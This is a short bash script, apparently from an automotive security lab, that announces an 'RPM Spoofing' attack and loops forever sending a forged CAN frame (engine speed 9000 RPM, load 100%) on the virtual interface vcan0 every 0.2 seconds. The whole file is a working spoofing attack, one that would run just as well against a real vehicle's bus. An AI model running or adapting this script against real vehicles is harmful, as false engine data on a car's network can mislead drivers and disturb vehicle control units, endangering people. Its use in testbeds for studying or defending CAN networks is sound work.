#!/bin/bash

echo "[ATTACK] RPM Spoofing started..."

while true
do
    # RPM = 9000 (0x2328)
    # Load = 100% (0x64)

    cansend vcan0 101#2328640000000000

    sleep 0.2
done